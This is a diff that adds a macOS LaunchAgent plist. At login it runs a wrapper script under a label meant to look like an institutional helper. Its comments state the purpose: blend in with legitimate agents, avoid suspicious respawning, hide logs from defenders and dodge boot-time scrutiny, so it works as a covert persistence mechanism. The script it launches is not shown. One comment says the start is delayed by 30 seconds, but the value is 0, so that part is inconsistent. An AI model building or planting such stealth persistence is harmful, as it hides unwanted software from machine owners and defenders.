@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+    "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <!-- Plausible institutional helper daemon — blends with real LaunchAgents -->
+    <key>Label</key>
+    <string>com.institute.syshelper.local</string>
+
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/bash</string>
+        <string>INSTALL_DIR_PLACEHOLDER/wrapper.sh</string>
+    </array>
+
+    <!-- Start on login -->
+    <key>RunAtLoad</key>
+    <true/>
+
+    <!-- Do NOT keep alive — a crashed process that respawns constantly is
+         more suspicious than one that starts once and stays running cleanly -->
+    <key>KeepAlive</key>
+    <false/>
+
+    <!-- Lowest CPU scheduling priority -->
+    <key>Nice</key>
+    <integer>19</integer>
+
+    <!-- Log output to hidden dir (not /tmp or ~/Desktop where defenders look) -->
+    <key>StandardOutPath</key>
+    <string>INSTALL_DIR_PLACEHOLDER/launchd.log</string>
+
+    <key>StandardErrorPath</key>
+    <string>INSTALL_DIR_PLACEHOLDER/launchd.log</string>
+
+    <!-- Delay start by 30s after login to avoid boot-time scrutiny -->
+    <key>StartInterval</key>
+    <integer>0</integer>
+
+</dict>
+</plist>
